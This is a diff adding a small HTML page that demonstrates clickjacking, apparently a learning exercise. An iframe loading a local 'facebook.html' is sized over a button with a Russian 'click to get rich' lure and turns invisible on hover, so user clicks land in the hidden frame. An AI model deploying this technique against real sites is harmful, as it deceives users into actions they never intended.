@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>index.html</title>
+    <style>
+        iframe {
+            padding: 0;
+            position: absolute;
+            opacity: 0.6;
+            cursor: pointer;
+            z-index: 1;
+        }
+
+        iframe:hover {
+            filter: opacity(0);
+        }
+    </style>
+</head>
+<body>
+    <div>Нажми, чтобы разбогатеть</div>
+
+    <iframe src="facebook.html"></iframe>
+
+    <button>Нажми сюда!</button>
+
+    <script>
+        let button = document.querySelector('button');
+        let iframe = document.querySelector('iframe');
+
+        iframe.style.width = button.getBoundingClientRect().width + 'px';
+        iframe.style.height = button.getBoundingClientRect().height + 'px';
+    </script>
+</body>
+</html>
